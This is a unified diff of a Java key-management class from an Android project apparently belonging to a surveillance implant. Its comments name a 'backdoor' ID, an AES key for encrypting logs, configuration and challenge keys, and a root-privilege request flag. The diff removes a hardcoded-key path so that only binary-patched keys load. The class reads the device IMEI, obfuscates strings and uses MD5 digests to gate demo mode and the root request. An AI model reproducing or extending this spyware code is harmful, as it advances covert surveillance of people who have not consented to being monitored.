@@ -7,8 +7,6 @@
 
 package com.android.dvci.crypto;
 
-import java.util.Arrays;
-
 import android.content.Context;
 import android.provider.Settings.Secure;
 import android.telephony.TelephonyManager;
@@ -16,20 +14,24 @@ import android.telephony.TelephonyManager;
 import com.android.dvci.Device;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.interfaces.iKeys;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.util.Arrays;
+
 // This class should only be read by Device
+
 /**
  * The Class Keys.
  */
-public class Keys implements iKeys{
+public class Keys {
 	private static final String TAG = "Keys"; //$NON-NLS-1$
-	/** The singleton. */
-	private static iKeys singleton;
+	/**
+	 * The singleton.
+	 */
+	private static Keys singleton;
 	private static int keyLen = 16;
 
 	// Subversion
@@ -40,23 +42,33 @@ public class Keys implements iKeys{
 	// 'D' };
 
 	// 20 bytes that uniquely identifies the device (non-static on purpose)
-	/** The g_ instance id. */
+	/**
+	 * The g_ instance id.
+	 */
 	private static byte[] instanceId;
 
 	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
-	/** The Constant g_BackdoorID. */
+	/**
+	 * The Constant g_BackdoorID.
+	 */
 	private static byte[] backdoorId;
 
 	// AES key used to encrypt logs
-	/** The Constant g_AesKey. */
+	/**
+	 * The Constant g_AesKey.
+	 */
 	private static byte[] aesKey;
 
 	// AES key used to decrypt configuration
-	/** The Constant g_ConfKey. */
+	/**
+	 * The Constant g_ConfKey.
+	 */
 	private static byte[] confKey;
 
 	// Challenge key
-	/** The Constant g_Challenge. */
+	/**
+	 * The Constant g_Challenge.
+	 */
 	private static byte[] challengeKey;
 
 	// Demo key
@@ -64,7 +76,7 @@ public class Keys implements iKeys{
 
 	// Privilege key
 	private static byte[] rootRequest;
-	
+
 	// Random seed
 	private static byte[] randomSeed;
 
@@ -72,25 +84,17 @@ public class Keys implements iKeys{
 
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the keys
 	 */
-	public static iKeys self() {
+	public static Keys self() {
 		if (singleton == null) {
 			synchronized (keysLock) {
 				if (singleton == null) {
-					if (Cfg.KEYS) {
-						if (Cfg.DEBUGKEYS) {
-							Check.log(TAG + " Using hardcoded keys");
-						}
-						singleton = new KeysFake();
-						
-					} else {
-						if (Cfg.DEBUGKEYS) {
-							Check.log(TAG + " Using binary patched keys");
-						}
-						singleton = new Keys(true);
+					if (Cfg.DEBUGKEYS) {
+						Check.log(TAG + " Using binary patched keys");
 					}
+					singleton = new Keys(true);
 				}
 			}
 		}
@@ -117,7 +121,7 @@ public class Keys implements iKeys{
 
 			final String imei = telephonyManager.getDeviceId();
 			androidId = imei;
-		}	
+		}
 
 		if (Cfg.DEBUGKEYS) {
 			Check.log(TAG + " (Keys), androidId: " + androidId);
@@ -137,7 +141,7 @@ public class Keys implements iKeys{
 			challengeKey = ByteArray.copy(resource, 78, 16); // 16 byte
 			demoMode = ByteArray.copy(resource, 110, 24); // 24 byte
 			rootRequest = ByteArray.copy(resource, 134, 16); // 16 byte
-			if(resource.length > 150)
+			if (resource.length > 150)
 				randomSeed = ByteArray.copy(resource, 150, 16); // 16 byte
 			else
 				randomSeed = new byte[16];
@@ -155,18 +159,18 @@ public class Keys implements iKeys{
 
 			if (isDemo()) {
 				Cfg.DEMO = true;
-			}		
+			}
 		}
 	}
 
 	public boolean isDemo() {
-		if(Cfg.FORCE_NODEMO) {
+		if (Cfg.FORCE_NODEMO) {
 			return false;
 		}
 		// Pg-WaVyPzMMMMmGbhP6qAigT md5= 863d9effe70187254d3c5e9c76613a99
 		byte[] demoDigest = ByteArray.hexStringToByteArray(M.e("863d9effe70187254d3c5e9c76613a99"));
 		byte[] calculated = Digest.MD5(demoMode);
-		
+
 		boolean ret = Arrays.equals(calculated, demoDigest);
 
 		if (Cfg.DEBUG) {
@@ -179,23 +183,23 @@ public class Keys implements iKeys{
 	}
 
 	public boolean wantsPrivilege() {
-		byte[] rootDigest = new byte[] { (byte) 0x3e, (byte) 0x96, (byte) 0xb7, (byte) 0x82, (byte) 0x7e, (byte) 0x89,
+		byte[] rootDigest = new byte[]{(byte) 0x3e, (byte) 0x96, (byte) 0xb7, (byte) 0x82, (byte) 0x7e, (byte) 0x89,
 				(byte) 0xda, (byte) 0xbc, (byte) 0xb5, (byte) 0x6c, (byte) 0xd3, (byte) 0x34, (byte) 0xfb, (byte) 0x70,
-				(byte) 0xb8, (byte) 0xba };
+				(byte) 0xb8, (byte) 0xba};
 
 		byte[] calculated = Digest.MD5(getRootRequest());
 
 		boolean ret = Arrays.equals(calculated, rootDigest);
 
-		if(Cfg.FORCE_ROOT){
-			ret =  true;
+		if (Cfg.FORCE_ROOT) {
+			ret = true;
 		}
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (wantsPrivilege MD5): " + ByteArray.byteArrayToHex(calculated)); //$NON-NLS-1$
 			Check.log(TAG + " (wantsPrivilege): " + ret); //$NON-NLS-1$
 		}
-		
+
 		return ret;
 	}
 
@@ -205,12 +209,12 @@ public class Keys implements iKeys{
 
 	/**
 	 * Check. for been binary patched. //$NON-NLS-1$
-	 * 
+	 *
 	 * @return true, if successful
 	 */
 	public boolean hasBeenBinaryPatched() {
 		// EMp7Ca7-fpOBIr md5=b1688ffaaaafd7c1cab52e630b53178f		
-		byte[] bDigest = ByteArray.hexStringToByteArray(M.e("b1688ffaaaafd7c1cab52e630b53178f"));		
+		byte[] bDigest = ByteArray.hexStringToByteArray(M.e("b1688ffaaaafd7c1cab52e630b53178f"));
 		byte[] calculated = Digest.MD5(backdoorId);
 
 		if (Cfg.DEBUG) {
@@ -222,7 +226,7 @@ public class Keys implements iKeys{
 
 	/**
 	 * Gets the aes key.
-	 * 
+	 *
 	 * @return the aes key
 	 */
 	public byte[] getAesKey() {
@@ -231,7 +235,7 @@ public class Keys implements iKeys{
 
 	/**
 	 * Gets the challenge key.
-	 * 
+	 *
 	 * @return the challenge key
 	 */
 	public byte[] getChallengeKey() {
@@ -240,7 +244,7 @@ public class Keys implements iKeys{
 
 	/**
 	 * Gets the conf key.
-	 * 
+	 *
 	 * @return the conf key
 	 */
 	public byte[] getConfKey() {
@@ -249,7 +253,7 @@ public class Keys implements iKeys{
 
 	/**
 	 * Gets the instance id.
-	 * 
+	 *
 	 * @return the instance id
 	 */
 	public byte[] getInstanceId() {
@@ -258,7 +262,7 @@ public class Keys implements iKeys{
 
 	/**
 	 * Gets the builds the id.
-	 * 
+	 *
 	 * @return the builds the id
 	 */
 	public byte[] getBuildId() {
@@ -267,10 +271,10 @@ public class Keys implements iKeys{
 
 	/**
 	 * Gets the subtype.
-	 * 
+	 *
 	 * @return the subtype
 	 */
-	static public  byte[] getSubtype() {
+	static public byte[] getSubtype() {
 		if (Cfg.DEMO) {
 			// 20.1=DEMO
 			return ("ANDROID-" + M.e("DEMO")).getBytes();
